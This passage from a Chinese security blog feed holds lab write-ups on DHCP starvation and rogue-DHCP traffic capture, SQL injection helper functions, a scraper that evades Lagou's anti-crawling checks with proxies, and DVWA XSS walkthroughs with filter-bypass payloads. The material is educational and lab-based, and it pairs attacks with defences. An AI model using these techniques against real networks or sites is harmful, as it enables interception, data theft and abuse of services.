href="http://blog.nsfocus.net/sql-zabbix-analysis-protection-scheme-injection-vulnerability/">http://blog.nsfocus.net/sql-zabbix-analysis-protection-scheme-injection-vulnerability/</a></li><li><a href="https://blog.csdn.net/csacs/article/details/86656618">https://blog.csdn.net/csacs/article/details/86656618</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验演示DHCP攻击与防护</title>
      <link href="2019/07/03/dhcp-security/"/>
      <url>2019/07/03/dhcp-security/</url>
      
        <content type="html"><![CDATA[<p>关于DHCP的各种攻击介绍可参考之前的一篇文章<a href="https://darkless.cn/2018/06/18/DHCP-snooping-summary/">DHCP snooping总结</a>,本文重点以实验的方式来演示DHCP的攻击与防御😊。</p><h2 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h2><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190703233314.png" alt="20190703233314.png"></p><p>实验模拟器使用的是GNS3，路由器及交换机为思科设备，DHCP服务器为winserver2008,攻击系统为kali linux。</p><h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><ol><li>先使用kali linux攻击正常的DHCP服务器使其地址耗尽</li><li>使用非法DHCP服务器为客户端分配地址，并将网关指向kali</li><li>在kali上配置路由使得客户端可以正常上网（防止客户端不能正常上网引起怀疑）</li><li>在kali上抓包即可看到客户端的所有数据包（最终目的）</li></ol><h2 id="使用dhcpig攻击正常的DHCP服务器"><a href="#使用dhcpig攻击正常的DHCP服务器" class="headerlink" title="使用dhcpig攻击正常的DHCP服务器"></a>使用dhcpig攻击正常的DHCP服务器</h2><p>DHCPig可以发起一个高级的DHCP耗尽攻击。它将消耗局域网内的所有IP地址以及阻止新客户端获取IP，同时它也防止旧客户端释放IP地址。另外，它会发送无效的ARP去把所有的windows主机震下线。关于DHCPig的使用方法请参考：<a href="https://blog.csdn.net/qq_29277155/article/details/51712059">https://blog.csdn.net/qq_29277155/article/details/51712059</a></p><p>先查看下当前DHCP服务器的地址池情况：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190703231704.png" alt="20190703231704.png"></p><p>地址池中有10个地址。</p><p>发起攻击：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190703222859.png" alt="20190703222859.png"></p><p>攻击完成后再次查看DHCP服务器统计情况，发现已经无地址可用。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190703223016.png" alt="20190703223016.png"></p><h2 id="启用非法DHCP服务器为客户端分配地址"><a href="#启用非法DHCP服务器为客户端分配地址" class="headerlink" title="启用非法DHCP服务器为客户端分配地址"></a>启用非法DHCP服务器为客户端分配地址</h2><p>可看到client已经获取到地址：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190703232647.png" alt="20190703232647.png"></p><p>并且网关为kali linux的地址：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190703232804.png" alt="20190703232804.png"></p><p>也就是说client上网的话必须经过kali linux</p><h2 id="在kali上配置路由"><a href="#在kali上配置路由" class="headerlink" title="在kali上配置路由"></a>在kali上配置路由</h2><p>在kali上配置路由使得client能够访问internet也就是10.1.1.0网段</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190703234401.png" alt="20190703234401.png"></p><blockquote><p>注意在为kali配置路由前需要先开启kali的路由转发功能：<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p></blockquote><p>此时client即可访问10.1.1.0网段了：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190703234555.png" alt="20190703234555.png"></p><h2 id="在kali上抓包"><a href="#在kali上抓包" class="headerlink" title="在kali上抓包"></a>在kali上抓包</h2><p>DHCP攻击的最终目的是能够在kali上抓到client访问internet的数据包.</p><p>在kali上抓包：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190704000904.png" alt="20190704000904.png"></p><p>可完整的查看到client访问的数据包，至此DHCP的攻击就算完成了。接下来说说怎么防御DHCP攻击</p><h2 id="DHCP攻击的防御"><a href="#DHCP攻击的防御" class="headerlink" title="DHCP攻击的防御"></a>DHCP攻击的防御</h2><p>DHCP攻击的防御在交换机上的实现很简单，只需要开启DHCP snooping功能即可，下面以思科交换机为例进行配置：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ip dhcp snoopingip dhcp snooping database disk0interface e0&#x2F;0    ip dhcp snooping trustinterface e0&#x2F;1    ip dhcp snooping limit rate 2ip dhcp snooping vlan 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置上述命令后即可防御DHCP的攻击，一旦发生DHCP DOS攻击，对应的接口会直接shutdown,需要手工up。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql手工注入常用函数总结</title>
      <link href="2019/06/01/sqli-common-fuction/"/>
      <url>2019/06/01/sqli-common-fuction/</url>
      
        <content type="html"><![CDATA[<h2 id="union和union-all"><a href="#union和union-all" class="headerlink" title="union和union all"></a>union和union all</h2><p>union和union all都是联合查询，用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中，区别在于union会去除重复的结果，union all不会。</p><blockquote><p>要注意的是前后两个select语句中的列数必须一致</p></blockquote><p>例：</p><p>现在数据库中有两个表，分别是：users和emails. 先看下这两个表中的内容：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602202613.png" alt="20190602202613.png"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602202759.png" alt="20190602202759.png"></p><p>使用union联合查询俩个表中的id：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602203006.png" alt="20190602203006.png"></p><p>可看到将两个表中的id全部查了出来，并且去除了重复结果。</p><p>使用union all进行查询则不会去除重复结果，如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602203124.png" alt="20190602203124.png"></p><p>当然也可以查询两个表中不同的字段数，如下所示：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602203339.png" alt="20190602203339.png"></p><h2 id="group-concat和concat"><a href="#group-concat和concat" class="headerlink" title="group_concat和concat"></a>group_concat和concat</h2><p>concat函数用于将多个字符串连接到一起形成一个字符串，效果如下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602204111.png" alt="20190602204111.png"></p><p>group_concat函数会将要查询的结果以一个组合的形式返回，group_concat需要和group_by函数配合使用，否则会将返回结果以一行显示。</p><p>例：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602205545.png" alt="20190602205545.png"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602205616.png" alt="20190602205616.png"></p><p>除此之外还可以使用Separator关键字加分隔符：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602210136.png" alt="20190602210136.png"></p><h2 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h2><p>该函数用于获取字符串的长度。</p><p>例：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602225638.png" alt="20190602225638.png"></p><h2 id="mid"><a href="#mid" class="headerlink" title="mid()"></a>mid()</h2><p>SQL MID() 函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被MS SQL Server和Oracle支持。在SQL Server， Oracle 数据库中，我们可以使用 SQL SUBSTRING函数或者 SQL SUBSTR函数作为替代。</p><p>MID() 函数语法为：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">MID</span><span class="token punctuation">(</span>ColumnName<span class="token punctuation">,</span> <span class="token keyword">Start</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> Length<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> TableName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602230242.png" alt="20190602230242.png"></p><h2 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h2><p>LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</p><p>用法：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">LEFT</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>LEFT()函数接受两个参数：</p><ul><li>str是要提取子字符串的字符串。</li><li>length是一个正整数，指定将从左边返回的字符数。</li></ul><p>LEFT()函数返回str字符串中最左边的长度字符。如果str或length参数为NULL，则返回NULL值。</p><p>如果length为0或为负，则LEFT函数返回一个空字符串。如果length大于str字符串的长度，则LEFT函数返回整个str字符串。</p><p>请注意，SUBSTRING(或SUBSTR)函数也提供与LEFT函数相同的功能。</p><p>例：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602231015.png" alt="20190602231015.png"></p><h2 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h2><p>substr和mid函数的作用和用法基本相同，只不过substr支持的数据库更多，mid只支持mysql数据库。</p><p>用法：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">substr<span class="token punctuation">(</span>string string<span class="token punctuation">,</span>num <span class="token keyword">start</span><span class="token punctuation">,</span>num length<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602231644.png" alt="20190602231644.png"></p><h2 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h2><p>ascii函数用来返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。这个函数可以和substr函数配合来使用猜测一个字符。</p><p>例：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602232248.png" alt="20190602232248.png"></p><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h2><p>sleep函数可以让sql执行的时候暂停一段时间，函数的返回结果为0.</p><p>例：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602232809.png" alt="20190602232809.png"></p><h2 id="if-expr1-expr2-expr3"><a href="#if-expr1-expr2-expr3" class="headerlink" title="if(expr1,expr2,expr3)"></a>if(expr1,expr2,expr3)</h2><p>语法如下：</p><p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</p><p>例：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602233337.png" alt="20190602233337.png"></p><h2 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h2><p>count函数是用来统计表中或数组中记录的一个函数，下面我来介绍在MySQL中count函数用法与性能比较吧。count(*) 它返回检索行的数目， 不论其是否包含 NULL值。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602233736.png" alt="20190602233736.png"></p><h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h2><p>load_file()可以用来读取文件，此函数的执行必须使用dba权限或者root权限。</p><p>需要注意的是：</p><p>mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p><ul><li>ure_file_priv的值为null ，表示限制mysqld 不允许导入,导出</li><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入,导出只能发生在/tmp/目录下</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入,导出做限制</li></ul><p>如何查看secure-file-priv参数的值：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%secure%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190602234516.png" alt="20190602234516.png"></p><h2 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile()"></a>into outfile()</h2><p>into outfile()函数可以将字符串写入文件，此函数的执行也需要很大的权限，并且目标目录可写。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拉勾网反爬虫解决方法</title>
      <link href="2019/05/25/lagou-crawl-solution/"/>
      <url>2019/05/25/lagou-crawl-solution/</url>
      
        <content type="html"><![CDATA[<p>这两天看了一篇文章是写爬取拉勾网职位信息的，看了以后想自己也尝试下。可能是拉钩网加了反爬，网上的大部分方法已经不能用了，我自己研究了下它的反爬措施，找出应对的方法即可完成爬取。</p><p>拉开拉钩随便搜索一个职位信息，F12查看请求与响应。</p><p>可在一个Ajax请求中找到有关职位的所有信息：</p><p>链接为：<a href="https://www.lagou.com/jobs/positionAjax.json?city=%E6%88%90%E9%83%BD&needAddtionalResult=false">https://www.lagou.com/jobs/positionAjax.json?city=成都&amp;needAddtionalResult=false</a></p><p><code>city</code>后面是城市名，还有三个参数一起被提交：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190525202226.png" alt="20190525202226.png"></p><p><code>first</code>表示是否为第一页，<code>pn</code>表示当前页数，<code>kd</code>表示职位名称</p><p>只要将这三个参数和上面的链接一起以post请求发送给拉钩，就可以获取一个json文件，里面有详细的职位信息。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190525202557.png" alt="20190525202557.png"></p><p>网上的爬虫也大部分是以这种方法去爬取的，但是现在打开这个链接后会有以下提示：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190525202817.png" alt="20190525202817.png"></p><p>对于这种，第一种方法：不去解析这个Ajax请求，直接提取html信息来完成抓取，但要注意请求次数和时间，不然会被禁ip。第二种方法就是我接下来要写的。</p><p>反复查看请求与响应，发现每次POST请求Ajax之前，都会先发送一个Get请求来获取用户的Session（Cookie）信息。</p><p>随后发送的Ajax请求会将此信息携带到cookie中，这样才会请求到正真的数据。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190525204056.png" alt="20190525204056.png"></p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190525204257.png" alt="20190525204257.png"></p><p>知道这个规律后就可以直接上代码了,关键代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span><span class="token punctuation">,</span><span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate, sdch'</span><span class="token punctuation">,</span><span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8'</span><span class="token punctuation">,</span><span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'Referer'</span><span class="token punctuation">:</span><span class="token string">'https://www.lagou.com/jobs/list_java?labelWords=&amp;fromSearch=true&amp;suginput=&amp;labelWords=hot'</span><span class="token punctuation">,</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4'</span><span class="token punctuation">&#125;</span><span class="token comment"># 网上找到的免费代理，可能会失效</span>proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"219.157.145.68:8118"</span><span class="token punctuation">,</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"120.83.110.86:9999"</span><span class="token punctuation">,</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"125.105.109.62:3128"</span><span class="token punctuation">,</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"171.221.35.32:8118"</span><span class="token punctuation">,</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token string">"122.193.245.108:9999"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">#设置一个会话</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 发送Get请求更新cookie</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://www.lagou.com/jobs/list_java?labelWords=&amp;fromSearch=true&amp;suginput=&amp;labelWords=hot'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'first'</span><span class="token punctuation">:</span><span class="token string">'true'</span><span class="token punctuation">,</span><span class="token string">'pn'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'kd'</span><span class="token punctuation">:</span><span class="token string">'java'</span><span class="token punctuation">&#125;</span><span class="token comment">#使用更新后的hsession请求Ajax json</span>rep <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'https://www.lagou.com/jobs/positionAjax.json?city=%E5%8C%97%E4%BA%AC&amp;needAddtionalResult=false'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token comment"># 请求成功，接下来就是提取想要的信息。</span><span class="token keyword">print</span><span class="token punctuation">(</span>rep<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考链接：</p><ul><li><a href="https://blog.csdn.net/williamgavin/article/details/81390014">https://blog.csdn.net/williamgavin/article/details/81390014</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DVWA 存储型XSS（XSS-Stored）</title>
      <link href="2019/05/13/dvwa-xss-stored/"/>
      <url>2019/05/13/dvwa-xss-stored/</url>
      
        <content type="html"><![CDATA[<h2 id="存储型XSS简介"><a href="#存储型XSS简介" class="headerlink" title="存储型XSS简介"></a>存储型XSS简介</h2><p>存储型XSS也叫持久型XSS，这种XSS需要服务端的参与，它与反射型XSS的区别在于XSS代码是否持久化（硬盘，数据库）。反射型XSS过程中后端服务器仅仅将XSS代码保存在内存中，并未持久化，因此每次触发反射性XSS都需要由用户输入相关的XSS代码；而持久型XSS则仅仅首次输入相关的XSS代码，保存在数据库中，当下次从数据库中获取该数据时在前端未加字串检测和excape转码时，会造成XSS，而且由于该漏洞的隐蔽性和持久型的特点，在多人开发的大型应用和跨应用间的数据获取时造成的大范围的XSS漏洞，危害尤其大。</p><p>存储型XSS最容易在留言板，个性签名等用户输入的文本会存储到数据库中的地方发生。</p><h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>此等级和反射型XSS一样没有做任何防护，直接输入js代码即可执行，需要注意的是，此js代码会存储进数据库中，每当用户访问此页面就会执行一次XSS。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518100040.png" alt="20190518100040.png"></p><p>提交到留言板中就会执行xss，并且每次刷新此页面就会被执行一次。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518100117.png" alt="20190518100117.png"></p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>提交Low等级的js代码，发现服务器将<code>&lt;script&gt;</code>标签过滤了。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518100326.png" alt="20190518100326.png"></p><p>那不使用<code>&lt;script&gt;</code>标签，换用其它标签试试。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518100453.png" alt="20190518100453.png"></p><p>发现输出结果为空，且没有执行XSS。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518101342.png" alt="20190518101342.png"></p><p>查看源码发现：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518101522.png" alt="20190518101522.png"></p><p>与Low级的相比，name值的处理增加了一个<code>str_replace()</code> 函数，用来将字符串中含有<code>&lt;script&gt;</code>的字符串替换为空字符，从而稍微有点过滤作用；message值的处理中，在其第二次调用<code>trim()</code>函数时还内嵌了两个函数，先是使用<code>addslashes()</code> 函数、返回在预定义字符之前添加反斜杠的字符串，然后调用<code>strip_tags()</code>函数来剥去字符串中的HTML、XML 以及 PHP 的标签，在最后再调用<code>htmlspecialchars()</code> 函数、把预定义的字符转换为 HTML 实体，对输入的内容先进行HTML的编码然后再存储进服务器中，从而使message的SQL和XSS漏洞几乎不存在。</p><p>但是此等级对<code>name</code>的输入过滤不足，可以进行利用。</p><p>在输入name时，发现只允许输入10个字符，此时需要构造不超过10个字符的js代码或者抓包修改name输入进行上传，我使用的是第二种方法。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518103202.png" alt="20190518103202.png"></p><p>发现js代码执行成功，注意<code>&lt;script&gt;</code>中S大写。</p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>查看源码发现，在Medium等级的基础上，对name的输入也增加过滤，使用正则匹配<code>&lt;script&gt;</code>并进行替换，且大小写都替换。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518103529.png" alt="20190518103529.png"></p><p>在Medium基础上重新构造js代码，不包含<code>&lt;script</code>即可。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518104502.png" alt="20190518104502.png"></p><p>但是并没有执行XSS ，查看源码发现插入的js代码变为了如下形式：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518104548.png" alt="20190518104548.png"></p><p>尝试将输入的js代码进行url编码后重新发送：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518110005.png" alt="20190518110005.png"></p><p>发现插入成功， xss执行。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518110042.png" alt="20190518110042.png"></p><h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190518110210.png" alt="20190518110210.png"></p><p>此等级对name和message的输入做了同等过滤，已无法进行xss。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA 反射型XSS（XSS-Reflected）</title>
      <link href="2019/05/12/dvwa-xss-reflected/"/>
      <url>2019/05/12/dvwa-xss-reflected/</url>
      
        <content type="html"><![CDATA[<h2 id="反射型XSS简介"><a href="#反射型XSS简介" class="headerlink" title="反射型XSS简介"></a>反射型XSS简介</h2><p>接着<a href="https://darkless.cn/2019/05/11/dvwa-xss-dom/">上篇文章</a>介绍下什么是反射性XSS。</p><p>在三种类型的XSS中，反射型XSS是利用最广泛的一种。它通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行。它的特点是非持久化，必须用户点击带有特定参数的链接才能引起。</p><h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>先尝试在输入框中随便输入一个字符。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512092549.png" alt="20190512092549.png"></p><p>可见，服务器是从输入框中获取用户输入，然后展示在前端页面上，那随便输入一段JS代码，看能否执行。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512092833.png" alt="20190512092833.png"></p><p>js代码被执行，说明存在xss攻击。</p><p>查看源码发现，并未对用户的输入做任何过滤：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512092952.png" alt="20190512092952.png"></p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>使用Low等级的方法，输入一下js代码</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512093136.png" alt="20190512093136.png"></p><p>发现前端直接显示了alert(1),说明将用户输入的<code>&lt;acript&gt;</code>标签做了过滤。 换一种构造方式，重新输入：</p><p>在输入框中输入:</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">'1'</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512093449.png" alt="20190512093449.png"></p><p>利用成功，查看源码发现对用户输入的<code>&lt;script&gt;</code>关键字做了替换，但并未对其它可能造成的xss攻击代码关键字做过滤。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512093623.png" alt="20190512093623.png"></p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>使用Medium等级的方法输入发现也可以造成xss攻击：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512093907.png" alt="20190512093907.png"></p><p>查看源码，发现只是用正则表达式匹配<code>&lt;script&gt;</code>里面的字母来做替换，并不能从根本上预防xss。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512094350.png" alt="20190512094350.png"></p><h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>随便输入一个字符查看结果：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512094547.png" alt="20190512094547.png"></p><p>发现此等级还使用了user_token。</p><p>使用High等级的方法进行输入：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512094659.png" alt="20190512094659.png"></p><p>发现直接将用户的输入原封不动的打印了出来，这样的话我们的任何构造输入都将无效。</p><p>查看源码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190512095029.png" alt="20190512095029.png"></p><p>发现使用了<code>htmlspecialchars()</code>函数，它会把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA DOM型XSS（XSS-DOM）</title>
      <link href="2019/05/11/dvwa-xss-dom/"/>
      <url>2019/05/11/dvwa-xss-dom/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS-简介"><a href="#XSS-简介" class="headerlink" title="XSS 简介"></a>XSS 简介</h2><p>XSS(Cross Site Scripting) 跨站脚本攻击，CSS的重点不在跨站上，而在脚本上。大多数的XSS攻击是在目标网站上嵌入一段恶意的JS代码来完成特性的攻击，如获取用户登陆信息，获取键盘输入，网页截屏等操作。</p><p>XSS的危害：</p><ul><li>通过document.cookie盗取cookie</li><li>使用js或css破坏页面正常的结构与样式</li><li>流量劫持（通过访问某段具有window.location.href定位到其他页面）</li><li>Dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。</li><li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li><li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li></ul><p>XSS大概有三种攻击方式，DOM型XSS, 反射性XSS，存储型XSS。</p><p>本篇文章先介绍DOM型XSS</p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>基于DOM的XSS不需要服务器参与参数的解析，完全由浏览器完成，DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。</p><blockquote><p>当javascript在浏览器执行时，浏览器提供给javascript代码几个DOM对象。文档对象首先在这些对象之中，并且它代表着大多数浏览器呈现的页面的属性。这个文档对象包含很多子对象，例如location，URL和referrer。这些对象根据浏览器的显示填充浏览器。因此， document.URL 和 